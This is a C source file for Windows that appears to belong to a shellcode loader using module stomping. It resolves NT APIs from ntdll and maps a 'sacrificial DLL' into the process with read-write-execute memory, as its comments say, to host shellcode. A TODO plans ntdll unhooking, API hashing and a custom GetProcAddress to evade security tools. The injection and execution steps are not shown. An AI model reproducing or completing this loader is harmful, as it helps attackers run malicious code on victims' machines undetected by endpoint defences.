#include "main.h"
#include "structs.h"



/*-----------------------------------------------
  Initialize the NT apis that will be used
  TODO: implement ntdll unhooking from KnownDLLs,
  also use custom GetProcAddress along with
  API hashing
-----------------------------------------------*/
BOOL InitAPIs() {

	HMODULE hModule = GetModuleHandleW(L"NTDLL");
	if (hModule == NULL) {
		DEBUG_PRINT("[!] Failed getting handle to ntdll\n");
		return FALSE;
	}

	NtAPIs.pNtClose = (fnNtClose)GetProcAddress(hModule, "NtClose");
	NtAPIs.pNtCreateFile = (fnNtCreateFile)GetProcAddress(hModule, "NtCreateFile");
	NtAPIs.pNtCreateSection = (fnNtCreateSection)GetProcAddress(hModule, "NtCreateSection");
	NtAPIs.pNtMapViewOfSection = (fnNtMapViewOfSection)GetProcAddress(hModule, "NtMapViewOfSection");
	NtAPIs.pNtProtectVirtualMemory = (fnNtProtectVirtualMemory)GetProcAddress(hModule, "NtProtectVirtualMemory");
	NtAPIs.IsInitialized = TRUE;
	return TRUE;
}



/*------------------------------------------------
  Map the sacrificial DLL in the current process
  and verify that the .text section is big enough
  for the shellcode
------------------------------------------------*/
BOOL MapDLL(HMODULE* hModule, PSIZE_T dllSize) {

	if (!NtAPIs.IsInitialized) {
		if (!InitAPIs()) {
			DEBUG_PRINT("[!] Failed initializing NTAPI struct\n");
			return FALSE;
		}
	}

	NTSTATUS status = NULL;
	HANDLE hSection = NULL,
		hFile = NULL;
	SIZE_T ViewSize = 0,
		sectionTextSize = 0,
		textOffsetSize = 0;
	ULONG_PTR dllBaseAddr = NULL,
		sectionTextAddr = NULL;
	IO_STATUS_BLOCK ioStatusBlock = { 0 };
	OBJECT_ATTRIBUTES objAttr = { 0 };
	UNICODE_STRING uDllPath;


	uDllPath.Buffer = (PWSTR)SACRIFICIAL_DLL;
	uDllPath.Length = wcslen(uDllPath.Buffer) * sizeof(WCHAR);
	uDllPath.MaximumLength = uDllPath.Length + sizeof(WCHAR);

	InitializeObjectAttributes(&objAttr, &uDllPath, OBJ_CASE_INSENSITIVE, NULL, NULL);

	WDEBUG_PRINT(L"[*] Opening the supplied DLL: %s\n", SACRIFICIAL_DLL);
	//Read the DLL
	status = NtAPIs.pNtCreateFile(
		&hFile,
		FILE_GENERIC_READ,
		&objAttr,
		&ioStatusBlock,
		NULL,
		FILE_ATTRIBUTE_NORMAL,
		FILE_SHARE_READ,
		FILE_OPEN,
		FILE_SYNCHRONOUS_IO_NONALERT | FILE_NON_DIRECTORY_FILE,
		NULL,
		0);
	if (status != 0x00) {
		DEBUG_PRINT("[!] NtCreateFile failed: 0x%X\n", status);
		return FALSE;
	}

	DEBUG_PRINT("[*] Creating a memory section from the DLL\n");
	//Create a section from the DLL
	status = NtAPIs.pNtCreateSection(&hSection, SECTION_ALL_ACCESS, NULL, 0, PAGE_READONLY, SEC_IMAGE, hFile);
	if (status != 0x00) {
		DEBUG_PRINT("[!] Failed creating section: 0x%X\n", status);
		NtAPIs.pNtClose(hFile);
		return FALSE;
	}

	NtAPIs.pNtClose(hFile);
	DEBUG_PRINT("[*] Mapping the section to the current process\n");
	//Map the created section
	status = NtAPIs.pNtMapViewOfSection(hSection, (HANDLE)-1, &dllBaseAddr, NULL, NULL, NULL, &ViewSize, ViewShare, NULL, PAGE_EXECUTE_READWRITE);
	if (status != 0x00) {
		DEBUG_PRINT("[!] Failed mapping the section: 0x%X\n", status);
		NtAPIs.pNtClose(hSection);
		return FALSE;
	}

	//Parse the DLL's headers
	DEBUG_PRINT("[*] Searching for the DLL's entrypoint\n");
	PIMAGE_NT_HEADERS ntHdrs = (PIMAGE_NT_HEADERS)(dllBaseAddr + ((PIMAGE_DOS_HEADER)dllBaseAddr)->e_lfanew);
	if (ntHdrs->Signature != IMAGE_NT_SIGNATURE) {
		DEBUG_PRINT("[!] Failed getting the NT headers\n");
		NtAPIs.pNtClose(hSection);
		return FALSE;
	}

	DEBUG_PRINT("\t> Base address: 0x%p\n", dllBaseAddr);
	DEBUG_PRINT("\t> DLL size: %d\n", ntHdrs->OptionalHeader.SizeOfImage);
	*hModule = (HMODULE)dllBaseAddr;
	*dllSize = ntHdrs->OptionalHeader.SizeOfImage;
	return TRUE;
}


